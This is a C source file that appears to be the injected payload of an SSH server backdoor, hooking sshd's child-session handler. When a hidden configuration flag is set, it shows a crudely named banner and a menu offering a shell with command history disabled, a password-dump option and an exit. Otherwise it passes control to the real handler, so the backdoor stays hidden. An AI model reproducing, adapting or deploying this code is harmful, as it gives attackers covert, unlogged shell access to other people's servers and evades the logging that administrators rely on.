#include "syscall.h"
#include "config.h"

void _memset(unsigned char *dst, unsigned char val, int len) {
	while(len--) {
		*dst++ = val;
	}
}

int _strlen(const char *s) {
	int len=0;

	while(*s++)
		len++;

	return len;
}

int _strncmp(unsigned char *s1, unsigned char *s2, int len) {
	while(len--) {
		if (*s1 != *s2) {
			return 1;
		}

		s1++;
		s2++;
	}

	return 0;
}

typedef struct {
    int used;
    int self;
    int next_unused;
    void *pw;
    void *authctxt;
    int pid;

    /* tty */
    char    *term;
} Session;

typedef int (*f_do_child)(Session*, char*);

int hook_main(Session *s, char *command) {
	char input[2];

	char *a_argv[]={
		"id", 0
	};

	char menu[]=
		"\n"
		"    >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n"
		"\n"
		"      _______  __________ ___.    _____     _____________  ______\n"
		"    _/  ____/_/  ____|   |   |   _\\ __ )_  _\\__   \\  __  \\/  __  )_ \n"
		"   /\\___   \\/\\___   \\|   '   |  |    /   \\/   _   /   /  /  __/___/_\n"
		"  /    /   /    /    /   |   \\  |   ,    /   /  . |  ___/   \\/     /\n"
		"  \\ _______\\ _______/____|____\\ |___:\\___\\_____/__|   | \\__________\\\n"
		"   \\/       \\/                                    \\___|\n"
		"\n"
		"                     **** SSH RAPE V0.9 BETA ****\n"
		"\n"
		"    <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n\n"
		"        [1] SHELL\n"
		"        [2] DUMP PASSWORDS\n"
		"        [3] EXIT\n\n";

	char prompt[]=
		"    CHOICE> ";

	char invalid_option[]=
		"\n    [!] ERROR: Invalid menu option!\n\n";

	char pass_str[]=
		"\nLOL passwords..\n\n";

	config_block *config_memory = (config_block*)(0xc0debabe13371337);

	f_do_child do_child = (f_do_child)(0xc0cac01ac0debabe);

	if (s->term != 0 && config_memory->is_haxor) {
		_write(1, menu, _strlen(menu));

		while(1) {
			_write(1, prompt, _strlen(prompt));
			_read(0, input, 2);
			switch(input[0]) {
				case '\r':
				case '\n':
 					continue;
				break;

				case '1':
					return do_child(s, "HISTFILE=/dev/null /bin/sh");
				break;

				case '2':
					_write(1, pass_str, _strlen(pass_str));
				break;

				case '3':
					return do_child(s, "exit");
				break;

				case '4':
					_execve("/usr/bin/id", a_argv, 0);
				break;

				default:
					_write(1, invalid_option, _strlen(invalid_option));
				break;
			}
		}
	}
	
	return do_child(s, command);
}
